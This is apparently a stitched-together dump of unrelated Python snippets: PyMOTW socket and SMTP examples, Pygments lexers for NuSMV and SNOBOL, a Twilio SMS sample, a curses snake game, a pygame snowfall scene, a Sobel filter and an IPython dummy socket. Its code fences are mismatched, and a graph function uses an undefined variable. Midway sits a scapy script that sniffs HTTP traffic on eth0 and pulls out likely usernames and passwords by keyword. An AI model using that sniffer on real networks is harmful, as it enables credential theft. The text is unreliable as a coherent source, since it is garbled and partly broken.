VERIFIED_NUMBER = "your own phone number verified with Twilio"

# Your Account Sid and Auth Token from twilio.com/console
TWILIO_SID = "YOUR TWILIO ACCOUNT SID"
TWILIO_AUTH_TOKEN = "YOUR TWILIO AUTH TOKEN"

# Create Client
client = Client(TWILIO_SID, TWILIO_AUTH_TOKEN)

# Send SMS
message = client.messages \
    .create(
        body='I am using twilio to send messages',
        from_=VIRTUAL_TWILIO_NUMBER,
        to=VERIFIED_NUMBER
    )

# Get Response
print(message.sid)

```









---


```py



#end_pymotw_header
import smtpd
import asyncore


class CustomSMTPServer(smtpd.SMTPServer):

    def process_message(self, peer, mailfrom, rcpttos, data):
        print('Receiving message from:', peer)
        print('Message addressed from:', mailfrom)
        print('Message addressed to  :', rcpttos)
        print('Message length        :', len(data))


server = CustomSMTPServer(('127.0.0.1', 1025), None)

asyncore.loop()

```









---


```py



#end_pymotw_header
import smtpd
import asyncore

server = smtpd.DebuggingServer(('127.0.0.1', 1025), None)

asyncore.loop()

```









---


```py



#end_pymotw_header
import smtpd
import asyncore

server = smtpd.PureProxy(('127.0.0.1', 1025), ('mail', 25))

asyncore.loop()

```









---


```py



#end_pymotw_header
import smtplib
import email.utils
from email.mime.text import MIMEText

# Create the message
msg = MIMEText('This is the body of the message.')
msg['To'] = email.utils.formataddr(('Recipient',
                                    'recipient@example.com'))
msg['From'] = email.utils.formataddr(('Author',
                                      'author@example.com'))
msg['Subject'] = 'Simple test message'

server = smtplib.SMTP('127.0.0.1', 1025)
server.set_debuglevel(True)  # show communication with the server
try:
    server.sendmail('author@example.com',
                    ['recipient@example.com'],
                    msg.as_string())
finally:
    server.quit()

```









---


```py



#end_pymotw_header
import smtplib
import email.utils
from email.mime.text import MIMEText
import getpass

# Prompt the user for connection info
to_email = input('Recipient: ')
servername = input('Mail server name: ')
serverport = input('Server port: ')
if serverport:
    serverport = int(serverport)
else:
    serverport = 25
use_tls = input('Use TLS? (yes/no): ').lower()
username = input('Mail username: ')
password = getpass.getpass("%s's password: " % username)

# Create the message
msg = MIMEText('Test message from PyMOTW.')
msg.set_unixfrom('author')
msg['To'] = email.utils.formataddr(('Recipient', to_email))
msg['From'] = email.utils.formataddr(('Author',
                                      'author@example.com'))
msg['Subject'] = 'Test from PyMOTW'

if use_tls == 'yes':
    print('starting with a secure connection')
    server = smtplib.SMTP_SSL(servername, serverport)
else:
    print('starting with an insecure connection')
    server = smtplib.SMTP(servername, serverport)
try:
    server.set_debuglevel(True)

    # identify ourselves, prompting server for supported features
    server.ehlo()

    # If we can encrypt this session, do it
    if server.has_extn('STARTTLS'):
        print('(starting TLS)')
        server.starttls()
        server.ehlo()  # reidentify ourselves over TLS connection
    else:
        print('(no STARTTLS)')

    if server.has_extn('AUTH'):
        print('(logging in)')
        server.login(username, password)
    else:
        print('(no AUTH)')

    server.sendmail('author@example.com',
                    [to_email],
                    msg.as_string())
finally:
    server.quit()

```









---


```py



#end_pymotw_header
import smtplib
import email.utils
from email.mime.text import MIMEText

# Create the message
msg = MIMEText('This is the body of the message.')
msg['To'] = email.utils.formataddr(('Recipient',
                                    'recipient@example.com'))
msg['From'] = email.utils.formataddr(('Author',
                                      'author@example.com'))
msg['Subject'] = 'Simple test message'

server = smtplib.SMTP('localhost', 1025)
server.set_debuglevel(True)  # show communication with the server
try:
    server.sendmail('author@example.com',
                    ['recipient@example.com'],
                    msg.as_string())
finally:
    server.quit()

```









---


```py



#end_pymotw_header
import smtplib

server = smtplib.SMTP('mail')
server.set_debuglevel(True)  # show communication with the server
try:
    dhellmann_result = server.verify('dhellmann')
    notthere_result = server.verify('notthere')
finally:
    server.quit()

print('dhellmann:', dhellmann_result)
print('notthere :', notthere_result)
````

````py
    pygments.lexers.smv
    ~~~~~~~~~~~~~~~~~~~

    Lexers for the SMV languages.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, words
from pygments.token import Comment, Keyword, Name, Number, Operator, \
    Punctuation, Text

__all__ = ['NuSMVLexer']


class NuSMVLexer(RegexLexer):
    """
    Lexer for the NuSMV language.

    .. versionadded:: 2.2
    """

    name = 'NuSMV'
    aliases = ['nusmv']
    filenames = ['*.smv']
    mimetypes = []

    tokens = {
        'root': [
            # Comments
            (r'(?s)\/\-\-.*?\-\-/', Comment),
            (r'--.*\n', Comment),

            # Reserved
            (words(('MODULE', 'DEFINE', 'MDEFINE', 'CONSTANTS', 'VAR', 'IVAR',
                    'FROZENVAR', 'INIT', 'TRANS', 'INVAR', 'SPEC', 'CTLSPEC',
                    'LTLSPEC', 'PSLSPEC', 'COMPUTE', 'NAME', 'INVARSPEC',
                    'FAIRNESS', 'JUSTICE', 'COMPASSION', 'ISA', 'ASSIGN',
                    'CONSTRAINT', 'SIMPWFF', 'CTLWFF', 'LTLWFF', 'PSLWFF',
                    'COMPWFF', 'IN', 'MIN', 'MAX', 'MIRROR', 'PRED',
                    'PREDICATES'), suffix=r'(?![\w$#-])'),
             Keyword.Declaration),
            (r'process(?![\w$#-])', Keyword),
            (words(('array', 'of', 'boolean', 'integer', 'real', 'word'),
                   suffix=r'(?![\w$#-])'), Keyword.Type),
            (words(('case', 'esac'), suffix=r'(?![\w$#-])'), Keyword),
            (words(('word1', 'bool', 'signed', 'unsigned', 'extend', 'resize',
                    'sizeof', 'uwconst', 'swconst', 'init', 'self', 'count',
                    'abs', 'max', 'min'), suffix=r'(?![\w$#-])'),
             Name.Builtin),
            (words(('EX', 'AX', 'EF', 'AF', 'EG', 'AG', 'E', 'F', 'O', 'G',
                    'H', 'X', 'Y', 'Z', 'A', 'U', 'S', 'V', 'T', 'BU', 'EBF',
                    'ABF', 'EBG', 'ABG', 'next', 'mod', 'union', 'in', 'xor',
                    'xnor'), suffix=r'(?![\w$#-])'),
                Operator.Word),
            (words(('TRUE', 'FALSE'), suffix=r'(?![\w$#-])'), Keyword.Constant),

            # Names
            (r'[a-zA-Z_][\w$#-]*', Name.Variable),

            # Operators
            (r':=', Operator),
            (r'[-&|+*/<>!=]', Operator),

            # Literals
            (r'\-?\d+\b', Number.Integer),
            (r'0[su][bB]\d*_[01_]+', Number.Bin),
            (r'0[su][oO]\d*_[0-7_]+', Number.Oct),
            (r'0[su][dD]\d*_[\d_]+', Number.Decimal),
            (r'0[su][hH]\d*_[\da-fA-F_]+', Number.Hex),

            # Whitespace, punctuation and the rest
            (r'\s+', Text.Whitespace),
            (r'[()\[\]{};?:.,]', Punctuation),
        ],
    }

import random
import curses
import math

# initialize the screen
s = curses.initscr()

# turn off the cursor
curses.curs_set(0)

# set the width and height of the screen
s_height, s_width = s.getmaxyx()

# create the window
w = curses.newwin(s_height, s_width, 0, 0)

# accept keypad input
w.keypad(1)

# refresh the screen every 200 ms
w.timeout(200)

snek_x = s_width / 4

snek_y = s_height / 2

snek = [
    [snek_y, snek_x],
    [snek_y, snek_x - 1],
    [snek_y, snek_x - 2],
]

food = [math.floor(s_height / 2), math.floor(s_width / 2)]
w.addch(food[0], food[1], curses.ACS_CKBOARD)

key = curses.KEY_RIGHT

running = True

while running:
    next_key = w.getch()
    key = key if next_key == -1 else next_key

    if snek[0][0] in [0, s_height] or snek[0][1] in [0, s_width
                                                     ] or snek[0] in snek[1:]:
        running = False
        curses.endwin()
        quit()

    new_head = [snek[0][0], snek[0][1]]

    if key == curses.KEY_DOWN:
        new_head[0] += 1

    if key == curses.KEY_UP:
        new_head[0] -= 1

    if key == curses.KEY_LEFT:
        new_head[1] -= 1

    if key == curses.KEY_RIGHT:
        new_head[1] += 1

    snek.insert(0, new_head)

    if snek[0] == food:
        food = None

        while food is None:
            new_food = [
                random.randint(1, s_height - 1),
                random.randint(1, s_width - 1)
            ]

            food = new_food if new_food not in snek else None
        w.addch(math.floor(food[0]), math.floor(food[1]), curses.ACS_CKBOARD)
    else:
        tail = snek.pop()
        w.addch(math.floor(tail[0]), math.floor(tail[1]), ' ')

    w.addch(math.floor(snek[0][0]), math.floor(snek[0][1]), curses.ACS_CKBOARD)

import scapy.all as scapy
from scapy.layers import http
# from scapy_http import http


def get_url(packet):
    # for detecting urls
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def sniff(interface):
    # prn it will excute a function which we will  give it after capturing packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # finding and printing Raw layer
        # print(packet[scapy.Raw].load)
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST >> \n" + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] possible username/password >>" + login_info +
                  "\n\n")

# ----interfaceon which you want to sniff
sniff("eth0")
````

````py
    pygments.lexers.snobol
    ~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the SNOBOL language.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Text, Comment, Operator, Keyword, Name, String, \
    Number, Punctuation

__all__ = ['SnobolLexer']


class SnobolLexer(RegexLexer):
    """
    Lexer for the SNOBOL4 programming language.

    Recognizes the common ASCII equivalents of the original SNOBOL4 operators.
    Does not require spaces around binary operators.

    .. versionadded:: 1.5
    """

    name = "Snobol"
    aliases = ["snobol"]
    filenames = ['*.snobol']
    mimetypes = ['text/x-snobol']

    tokens = {
        # root state, start of line
        # comments, continuation lines, and directives start in column 1
        # as do labels
        'root': [
            (r'\*.*\n', Comment),
            (r'[+.] ', Punctuation, 'statement'),
            (r'-.*\n', Comment),
            (r'END\s*\n', Name.Label, 'heredoc'),
            (r'[A-Za-z$][\w$]*', Name.Label, 'statement'),
            (r'\s+', Text, 'statement'),
        ],
        # statement state, line after continuation or label
        'statement': [
            (r'\s*\n', Text, '#pop'),
            (r'\s+', Text),
            (r'(?<=[^\w.])(LT|LE|EQ|NE|GE|GT|INTEGER|IDENT|DIFFER|LGT|SIZE|'
             r'REPLACE|TRIM|DUPL|REMDR|DATE|TIME|EVAL|APPLY|OPSYN|LOAD|UNLOAD|'
             r'LEN|SPAN|BREAK|ANY|NOTANY|TAB|RTAB|REM|POS|RPOS|FAIL|FENCE|'
             r'ABORT|ARB|ARBNO|BAL|SUCCEED|INPUT|OUTPUT|TERMINAL)(?=[^\w.])',
             Name.Builtin),
            (r'[A-Za-z][\w.]*', Name),
            # ASCII equivalents of original operators
            # | for the EBCDIC equivalent, ! likewise
            # \ for EBCDIC negation
            (r'\*\*|[?$.!%*/#+\-@|&\\=]', Operator),
            (r'"[^"]*"', String),
            (r"'[^']*'", String),
            # Accept SPITBOL syntax for real numbers
            # as well as Macro SNOBOL4
            (r'[0-9]+(?=[^.EeDd])', Number.Integer),
            (r'[0-9]+(\.[0-9]*)?([EDed][-+]?[0-9]+)?', Number.Float),
            # Goto
            (r':', Punctuation, 'goto'),
            (r'[()<>,;]', Punctuation),
        ],
        # Goto block
        'goto': [
            (r'\s*\n', Text, "#pop:2"),
            (r'\s+', Text),
            (r'F|S', Keyword),
            (r'(\()([A-Za-z][\w.]*)(\))',
             bygroups(Punctuation, Name.Label, Punctuation))
        ],
        # everything after the END statement is basically one
        # big heredoc.
        'heredoc': [
            (r'.*\n', String.Heredoc)
        ]
    }

import pygame
import random

pygame.init()
#setting the output window
white = (255, 255, 255)
myDisplay = pygame.display.set_mode((550, 550))
pygame.display.set_caption("Snow falls")
#making the circles
SnowFall= []
for i in range(150):
    x = random.randrange(0, 550)
    y = random.randrange(0, 550)
    SnowFall.append([x, y])


clock = pygame.time.Clock()
fram = False
background_position = [0, 0]
#setting the bg image
background_image = pygame.image.load("C:\\Users\\shahn\\PycharmProjects\\image_converter\\img.jpg")
while not fram:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            fram = True

    myDisplay.blit(background_image, background_position)
    #moving the circles
    for n in SnowFall:
        n[1] += 1
        pygame.draw.circle(myDisplay, white, n, 4)

        if n[1] > 550:
            n[1] = random.randrange(-50, -5)
            n[0] = random.randrange(826)

    pygame.display.flip()
    #setting time for transition
    clock.tick(60)
# @Author  : lightXu
# @File    : sobel_filter.py
# @Time    : 2019/7/8 0008 下午 16:26
import numpy as np
from cv2 import COLOR_BGR2GRAY, cvtColor, imread, imshow, waitKey

from digital_image_processing.filters.convolve import img_convolve


def sobel_filter(image):
    kernel_x = np.array([[-1, 0, 1], [-2, 0, 2], [-1, 0, 1]])
    kernel_y = np.array([[1, 2, 1], [0, 0, 0], [-1, -2, -1]])

    dst_x = np.abs(img_convolve(image, kernel_x))
    dst_y = np.abs(img_convolve(image, kernel_y))
    # modify the pix within [0, 255]
    dst_x = dst_x * 255 / np.max(dst_x)
    dst_y = dst_y * 255 / np.max(dst_y)

    dst_xy = np.sqrt((np.square(dst_x)) + (np.square(dst_y)))
    dst_xy = dst_xy * 255 / np.max(dst_xy)
    dst = dst_xy.astype(np.uint8)

    theta = np.arctan2(dst_y, dst_x)
    return dst, theta


if __name__ == "__main__":
    # read original image
    img = imread("../image_data/lena.jpg")
    # turn image in gray scale value
    gray = cvtColor(img, COLOR_BGR2GRAY)

    sobel_grad, sobel_theta = sobel_filter(gray)

    # show result images
    imshow("sobel filter", sobel_grad)
    imshow("sobel theta", sobel_theta)
    waitKey(0)

import random

def populate_graph(self, num_users, avg_friendships):
        """
        Takes a number of users and an average number of friendships
        as arguments
        Creates that number of users and a randomly distributed friendships
        between those users.
        The number of users must be greater than the average number of friendships.
        """
        # Reset graph
        self.last_id = 0
        self.users = {}
        self.friendships = {}
        # !!!! IMPLEMENT ME

        # Add users
        for i in range(0, num_users):
            self.addUser(f"User {i}")

        # Create friendships
        # generate all possible friendship combinations
        possible_friendships = []

        # avoid dupes by ensuring the first number is smaller than the second
        for friend_id in range(user_id + 1, self.last_id + 1):
            possible_friendships.append((user_id, friend_id))

        # shuffle the possible friendships
        random.shuffle(possible_friendships)

        # create friendships for the first X pairs of the list
        # X determined by the formula num users * avg friendships // 2
        # need to divide by 2 since each add friendship creates 2 friendships
        for i in range(num_users * avg_friendships // 2):
            friendship = possible_friendships[i]
            self.add_friendship(friendship[0], friendship[1])```


```py Defines a dummy socket implementing (part of) the zmq.Socket interface. """

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import abc
from queue import Queue
import warnings

import zmq

from traitlets import HasTraits, Instance, Int

#-----------------------------------------------------------------------------
# Dummy socket class
#-----------------------------------------------------------------------------

class DummySocket(HasTraits):
    """ A dummy socket implementing (part of) the zmq.Socket interface. """

    queue = Instance(Queue, ())
    message_sent = Int(0) # Should be an Event
    context = Instance(zmq.Context)
    def _context_default(self):
        return zmq.Context()

    #-------------------------------------------------------------------------
    # Socket interface
    #-------------------------------------------------------------------------

    def recv_multipart(self, flags=0, copy=True, track=False):
        return self.queue.get_nowait()

    def send_multipart(self, msg_parts, flags=0, copy=True, track=False):
        msg_parts = list(map(zmq.Message, msg_parts))
        self.queue.put_nowait(msg_parts)
        self.message_sent += 1

    def flush(self, timeout=1.0):
        """no-op to comply with stream API"""
        pass

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyString and binary representations of addresses.```


```py

#end_pymotw_header
import binascii
import socket
import struct
import sys

for string_address in ['192.168.1.1', '127.0.0.1']:
    packed = socket.inet_aton(string_address)
    print('Original:', string_address)
    print('Packed  :', binascii.hexlify(packed))
    print('Unpacked:', socket.inet_ntoa(packed))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySend binary data```


```py

#end_pymotw_header
import binascii
import socket
import struct
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 10000)
sock.connect(server_address)

values = (1, b'ab', 2.7)
packer = struct.Struct('I 2s f')
packed_data = packer.pack(*values)

print('values =', values)

try:
    # Send data
    print('sending {!r}'.format(binascii.hexlify(packed_data)))
    sock.sendall(packed_data)
finally:
    print('closing socket')
    sock.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReceive and unpack binary data```


```py

#end_pymotw_header
import binascii
import socket
import struct
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 10000)
sock.bind(server_address)
sock.listen(1)

unpacker = struct.Struct('I 2s f')

while True:
    print('\nwaiting for a connection')
    connection, client_address = sock.accept()
    try:
        data = connection.recv(unpacker.size)
        print('received {!r}'.format(binascii.hexlify(data)))

        unpacked_data = unpacker.unpack(data)
        print('unpacked:', unpacked_data)

    finally:
        connection.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyClient half of echo example```


```py

#end_pymotw_header
import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = ('localhost', 10000)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

try:

    # Send data
    message = b'This is the message.  It will be repeated.'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    # Look for the response
    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(16)
        amount_received += len(data)
        print('received {!r}'.format(data))

finally:
    print('closing socket')
    sock.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyClient half of echo example```


```py

#end_pymotw_header
import socket
import sys

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

server_address = ('localhost', 10000)
message = b'This is the message.  It will be repeated.'

try:

    # Send data
    print('sending {!r}'.format(message))
    sent = sock.sendto(message, server_address)

    # Receive response
    print('waiting to receive')
    data, server = sock.recvfrom(4096)
    print('received {!r}'.format(data))

finally:
    print('closing socket')
    sock.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyClient half of echo example```


```py

#end_pymotw_header
import socket
import sys


def get_constants(prefix):
    """Create a dictionary mapping socket module
    constants to their names.
    """
    return {
        getattr(socket, n): n
        for n in dir(socket)
        if n.startswith(prefix)
    }


families = get_constants('AF_')
types = get_constants('SOCK_')
protocols = get_constants('IPPROTO_')

# Create a TCP/IP socket
sock = socket.create_connection(('localhost', 10000))

print('Family  :', families[sock.family])
print('Type    :', types[sock.type])
print('Protocol:', protocols[sock.proto])
print()

try:

    # Send data
    message = b'This is the message.  It will be repeated.'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(16)
        amount_received += len(data)
        print('received {!r}'.format(data))

finally:
    print('closing socket')
    sock.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyClient half of echo example```


```py

#end_pymotw_header
import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port on the server
# given by the caller
server_address = (sys.argv[1], 10000)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

try:

    message = b'This is the message.  It will be repeated.'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while amount_received < amount_expected:
        data = sock.recv(16)
        amount_received += len(data)
        print('received {!r}'.format(data))

finally:
    sock.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyClient half of echo example```


```py

#end_pymotw_header
import socket
import sys

# Create a UDS socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = './uds_socket'
print('connecting to {}'.format(server_address))
try:
    sock.connect(server_address)
except socket.error as msg:
    print(msg)
    sys.exit(1)

try:

    # Send data
    message = b'This is the message.  It will be repeated.'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(16)
        amount_received += len(data)
        print('received {!r}'.format(data))

finally:
    print('closing socket')
    sock.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyServer half of echo example.```


```py

#end_pymotw_header
import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('localhost', 10000)
print('starting up on {} port {}'.format(*server_address))
sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)

while True:
    # Wait for a connection
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        print('connection from', client_address)

        # Receive the data in small chunks and retransmit it
        while True:
            data = connection.recv(16)
            print('received {!r}'.format(data))
            if data:
                print('sending data back to the client')
                connection.sendall(data)
            else:
                print('no data from', client_address)
                break

    finally:
        # Clean up the connection
        connection.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyServer half of echo example.```


```py

#end_pymotw_header
import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address given on the command line
server_address = ('', 10000)
sock.bind(server_address)
print('starting up on {} port {}'.format(*sock.getsockname()))
sock.listen(1)

while True:
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        print('client connected:', client_address)
        while True:
            data = connection.recv(16)
            print('received {!r}'.format(data))
            if data:
                connection.sendall(data)
            else:
                break
    finally:
        connection.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDatagram echo server```


```py

#end_pymotw_header
import socket
import sys

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Bind the socket to the port
server_address = ('localhost', 10000)
print('starting up on {} port {}'.format(*server_address))
sock.bind(server_address)

while True:
    print('\nwaiting to receive message')
    data, address = sock.recvfrom(4096)

    print('received {} bytes from {}'.format(
        len(data), address))
    print(data)

    if data:
        sent = sock.sendto(data, address)
        print('sent {} bytes back to {}'.format(
            sent, address))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyServer half of echo example.```


```py

#end_pymotw_header
import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address given on the command line
server_name = sys.argv[1]
server_address = (server_name, 10000)
print('starting up on {} port {}'.format(*server_address))
sock.bind(server_address)
sock.listen(1)

while True:
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        print('client connected:', client_address)
        while True:
            data = connection.recv(16)
            print('received {!r}'.format(data))
            if data:
                connection.sendall(data)
            else:
                break
    finally:
        connection.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyServer half of echo example, using Unix domain sockets```


```py

#end_pymotw_header
import socket
import sys
import os

server_address = './uds_socket'

# Make sure the socket does not already exist
try:
    os.unlink(server_address)
except OSError:
    if os.path.exists(server_address):
        raise

# Create a UDS socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

# Bind the socket to the address
print('starting up on {}'.format(server_address))
sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)

while True:
    # Wait for a connection
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        print('connection from', client_address)

        # Receive the data in small chunks and retransmit it
        while True:
            data = connection.recv(16)
            print('received {!r}'.format(data))
            if data:
                print('sending data back to the client')
                connection.sendall(data)
            else:
                print('no data from', client_address)
                break

    finally:
        # Clean up the connection
        connection.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGet address info for a service```


```py

#end_pymotw_header
import socket


def get_constants(prefix):
    """Create a dictionary mapping socket module
    constants to their names.
    """
    return {
        getattr(socket, n): n
        for n in dir(socket)
        if n.startswith(prefix)
    }


families = get_constants('AF_')
types = get_constants('SOCK_')
protocols = get_constants('IPPROTO_')

for response in socket.getaddrinfo('www.python.org', 'http'):

    # Unpack the response tuple
    family, socktype, proto, canonname, sockaddr = response

    print('Family        :', families[family])
    print('Type          :', types[socktype])
    print('Protocol      :', protocols[proto])
    print('Canonical name:', canonname)
    print('Socket address:', sockaddr)
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGet address info for a service```


```py

#end_pymotw_header
import socket


def get_constants(prefix):
    """Create a dictionary mapping socket module
    constants to their names.
    """
    return {
        getattr(socket, n): n
        for n in dir(socket)
        if n.startswith(prefix)
    }


families = get_constants('AF_')
types = get_constants('SOCK_')
protocols = get_constants('IPPROTO_')

responses = socket.getaddrinfo(
    host='www.python.org',
    port='http',
    family=socket.AF_INET,
    type=socket.SOCK_STREAM,
    proto=socket.IPPROTO_TCP,
    flags=socket.AI_CANONNAME,
)

for response in responses:
    # Unpack the response tuple
    family, socktype, proto, canonname, sockaddr = response

    print('Family        :', families[family])
    print('Type          :', types[socktype])
    print('Protocol      :', protocols[proto])
    print('Canonical name:', canonname)
    print('Socket address:', sockaddr)
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLook up the fully qualified domain name for a host.```


```py

#end_pymotw_header
import socket

for host in ['apu', 'pymotw.com']:
    print('{:>10} : {}'.format(host, socket.getfqdn(host)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLook up a hostname from its address.```


```py

#end_pymotw_header
import socket

hostname, aliases, addresses = socket.gethostbyaddr('10.9.0.10')

print('Hostname :', hostname)
print('Aliases  :', aliases)
print('Addresses:', addresses)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConvert hostname to IP address.```


```py

#end_pymotw_header
import socket

HOSTS = [
    'apu',
    'pymotw.com',
    'www.python.org',
    'nosuchname',
]

for host in HOSTS:
    try:
        print('{} : {}'.format(host, socket.gethostbyname(host)))
    except socket.error as msg:
        print('{} : {}'.format(host, msg))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConvert hostname to IP address.```


```py

#end_pymotw_header
import socket

HOSTS = [
    'apu',
    'pymotw.com',
    'www.python.org',
    'nosuchname',
]

for host in HOSTS:
    print(host)
    try:
        name, aliases, addresses = socket.gethostbyname_ex(host)
        print('  Hostname:', name)
        print('  Aliases :', aliases)
        print(' Addresses:', addresses)
    except socket.error as msg:
        print('ERROR:', msg)
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLook up the name of the current host```


```py

#end_pymotw_header
import socket

print(socket.gethostname())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLookup the constant for a named protocol.```


```py

#end_pymotw_header
import socket


def get_constants(prefix):
    """Create a dictionary mapping socket module
    constants to their names.
    """
    return {
        getattr(socket, n): n
        for n in dir(socket)
        if n.startswith(prefix)
    }


protocols = get_constants('IPPROTO_')

for name in ['icmp', 'udp', 'tcp']:
    proto_num = socket.getprotobyname(name)
    const_name = protocols[proto_num]
    print('{:>4} -> {:2d} (socket.{:<12} = {:2d})'.format(
        name, proto_num, const_name,
        getattr(socket, const_name)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLook up port numbers for a service by name.```


```py

#end_pymotw_header
import socket
from urllib.parse import urlparse

URLS = [
    'http://www.python.org',
    'https://www.mybank.com',
    'ftp://prep.ai.mit.edu',
    'gopher://gopher.micro.umn.edu',
    'smtp://mail.example.com',
    'imap://mail.example.com',
    'imaps://mail.example.com',
    'pop3://pop.example.com',
    'pop3s://pop.example.com',
]

for url in URLS:
    parsed_url = urlparse(url)
    port = socket.getservbyname(parsed_url.scheme)
    print('{:>6} : {}'.format(parsed_url.scheme, port))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLook up a service name by its port number.```


```py

#end_pymotw_header
import socket
from urllib.parse import urlunparse

for port in [80, 443, 21, 70, 25, 143, 993, 110, 995]:
    url = '{}://example.com/'.format(socket.getservbyport(port))
    print(url)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyString and binary representations of addresses.```


```py

#end_pymotw_header
import binascii
import socket
import struct
import sys

string_address = '2002:ac10:10a:1234:21e:52ff:fe74:40e'
packed = socket.inet_pton(socket.AF_INET6, string_address)

print('Original:', string_address)
print('Packed  :', binascii.hexlify(packed))
print('Unpacked:', socket.inet_ntop(socket.AF_INET6, packed))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyReceive multicast messages.```


```py

#end_pymotw_header
import socket
import struct
import sys

multicast_group = '224.3.29.71'
server_address = ('', 10000)

# Create the socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Bind to the server address
sock.bind(server_address)

# Tell the operating system to add the socket to
# the multicast group on all interfaces.
group = socket.inet_aton(multicast_group)
mreq = struct.pack('4sL', group, socket.INADDR_ANY)
sock.setsockopt(
    socket.IPPROTO_IP,
    socket.IP_ADD_MEMBERSHIP,
    mreq)

# Receive/respond loop
while True:
    print('\nwaiting to receive message')
    data, address = sock.recvfrom(1024)

    print('received {} bytes from {}'.format(
        len(data), address))
    print(data)

    print('sending acknowledgement to', address)
    sock.sendto(b'ack', address)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySending multicast messages.```


```py

#end_pymotw_header
import socket
import struct
import sys

message = b'very important data'
multicast_group = ('224.3.29.71', 10000)

# Create the datagram socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Set a timeout so the socket does not block
# indefinitely when trying to receive data.
sock.settimeout(0.2)

# Set the time-to-live for messages to 1 so they do not
# go past the local network segment.
ttl = struct.pack('b', 1)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)

try:

    # Send data to the multicast group
    print('sending {!r}'.format(message))
    sent = sock.sendto(message, multicast_group)

    # Look for responses from all recipients
    while True:
        print('waiting to receive')
        try:
